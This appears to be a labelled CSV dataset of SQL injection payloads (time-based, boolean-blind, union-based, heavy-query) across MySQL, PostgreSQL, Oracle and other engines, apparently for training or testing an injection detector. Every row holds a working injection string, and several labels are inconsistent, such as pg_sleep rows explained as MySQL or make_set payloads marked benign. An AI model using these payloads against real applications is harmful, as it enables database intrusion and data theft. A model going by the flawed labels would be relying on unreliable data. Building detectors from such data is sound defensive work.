id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20272,"1"" where 3329 = 3329 or sleep ( 5 ) --",time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20273,"1' where 7014 = 7014 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20274,"1"" ) ) as duny where 3756 = 3756 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,Pattern '\bdbms_pipe\.receive_message' matched; type=time_blind,2
20275,"1"" where 1920 = 1920 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,Heuristic analysis: heavy_query inferred from structure,2
20276,select ( case when ( 9246 = 6326 ) then 9246 else 9246* ( select 9246 from mysql.db ) end ) #,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20277,1' in boolean mode ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) #,boolean_blind,firebird,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20278,"1' ) ) and elt ( 3053 = 9778,9778 ) and ( ( 'yfaa' like 'yfaa",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20279,"-6145'+ ( select nnjn where 1389 = 1389 union all select 1389,1389,1389--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20280,"end and ( ( ( ""%"" = """,benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20281,"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20282,"1%"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ""%"" = """,boolean_blind,generic,0.75,Pattern '\bcase\s+when' matched; type=boolean_blind,1
20283,"1"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""ypoj"" = ""ypoj",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20284,"1%"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,heavy_query,generic,0.65,Heuristic analysis: heavy_query inferred from structure,0
20285,"-9615 ) as dntk where 4780 = 4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20286,"1"" where 3990 = 3990 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20287,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'dgvg' = 'dgvg,time_blind,postgresql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20288,"1' ) ) as jpxj where 6153 = 6153 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,Heuristic analysis: heavy_query inferred from structure,2
20289,"1' where 4860 = 4860 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20290,"1' where 7688 = 7688 union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20291,"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20292,"1"" ) where 8612 = 8612",boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20293,"1' ) and make_set ( 8403 = 8403,8899 ) and ( 'kyxl' = 'kyxl",benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20294,1' where 1017 = 1017 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20295,-4947' order by 1#,benign,generic,0.9,Heuristic analysis: benign inferred from structure,2
20296,"1"" where 6023 = 6023",boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20297,"1'|| ( select 'ypil' from dual where 4568 = 4568 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ) ||'",boolean_blind,oracle,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20298,"1%"" ) ) ) and 9198 = 9198--",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20299,1' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'bmhw' like 'bmhw,boolean_blind,generic,0.75,Pattern '\bcase\s+when' matched; type=boolean_blind,1
20300,"1"" and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ""mbas"" = ""mbas",boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20301,1 where 4785 = 4785 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20302,"1"" ) ) and elt ( 6553 = 4771,4771 ) and ( ( ""eolu"" = ""eolu",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20303,"1' ) ) ) union all select null,null,null--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20304,"1 ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 8280 = 8280",time_blind,mysql,0.75,"'benchmark(N, function)' causes CPU delay; MySQL time-blind confirmed",1
20305,"1' ) ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20306,"-7714 where 9768 = 9768 union all select 9768,9768--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20307,"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",boolean_blind,db2,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20308,1 ) ) as uadn where 9588 = 9588 rlike sleep ( 5 ) #,time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20309,1 ) as wiyx where 6515 = 6515,boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20310,"-3433' ) where 8307 = 8307 union all select 8307,8307,8307,8307,8307,8307,8307,8307--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20311,-3960' or 9323 = 9323#,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20312,"-4427' ) ) union all select 6357,6357,6357,6357,6357#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20313,1 ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 4968 = 4968,boolean_blind,mysql,0.9,'RLIKE' regex operator; MySQL boolean context.....,2
20314,"1'+ ( select 'vfkl' where 1713 = 1713 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) +'",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20315,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20316,"-7088'|| ( select 'arol' from dual where 8891 = 8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20317,1 ) ) ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ( 8023 = 8023,boolean_blind,generic,0.65,Pattern '\bcase\s+when' matched; type=boolean_blind,0
20318,"1"" where 4672 = 4672",boolean_blind,generic,0.75,Heuristic analysis: boolean_blind inferred from structure,1
20319,"1"" and make_set ( 8262 = 3471,3471 ) and ""wayp"" = ""wayp",benign,generic,0.75,Heuristic analysis: benign inferred from structure,1
20320,"1"" ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,Heuristic analysis: heavy_query inferred from structure,2
20321,"1%"" ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""%"" = """,boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20322,"1"" ) ) ) union all select null,null,null,null#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20323,"1"" ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ""hybu"" like ""hybu",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20324,"1 ) where 5096 = 5096 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,Heuristic analysis: heavy_query inferred from structure,2
20325,"select sleep ( 5 ) and ( ( ""wueo"" = ""wueo",time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20326,"1"" where 4183 = 4183 union all select null,null,null,null,null,null--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20327,"1"" ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""htyi"" = ""htyi",heavy_query,postgresql,0.75,Heuristic analysis: heavy_query inferred from structure,1
20328,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20329,"-5904"" where 9782 = 9782 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20330,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 4982 = 4982,time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20331,select ( case when ( 3499 = 4209 ) then 3499 else 3499* ( select 3499 from mysql.db ) end ) #,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20332,select ( case when ( 1776 = 7688 ) then 1776 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.9,Pattern '\bcase\s+when' matched; type=boolean_blind,2
20333,select sleep ( 5 ) and ( ( 8679 = 8679,time_blind,mysql,0.75,'sleep()' time-delay function matched; MySQL time-based blind SQLi confirmed,1
20334,"-1823 where 6852 = 6852 union all select 6852,6852,6852,6852,6852,6852#",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20335,-9708' where 8150 = 8150 or 6872 = 6872--,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20336,"-2639"" ) where 1494 = 1494 union all select 1494--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20337,"-3037"" ) ) ) or elt ( 4758 = 9129,9129 ) and ( ( ( ""zewv"" like ""zewv",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20338,"-4825%' ) union all select 6804,6804,6804,6804,6804,6804,6804--",union_based,generic,0.9,'UNION ALL SELECT' structure detected; classic union-based SQLi,2
20339,"1"" where 2221 = 2221 and 5318 = 8398--",boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20340,"1"" ) ) ) and elt ( 1750 = 7826,7826 ) and ( ( ( ""qcro"" = ""qcro",boolean_blind,mysql,0.75,'ELT()' conditional function; MySQL boolean-blind context,1
20341,-7742 ) as tgzq where 7842 = 7842 or 2062 = 1563,boolean_blind,generic,0.9,Heuristic analysis: boolean_blind inferred from structure,2
20342,"1' ) ) as babx where 2494 = 2494 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.65,Heuristic analysis: heavy_query inferred from structure,0
20343,"1'+ ( select wkay where 5476 = 5476 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) +'",heavy_query,postgresql,0.75,Heuristic analysis: heavy_query inferred from structure,1
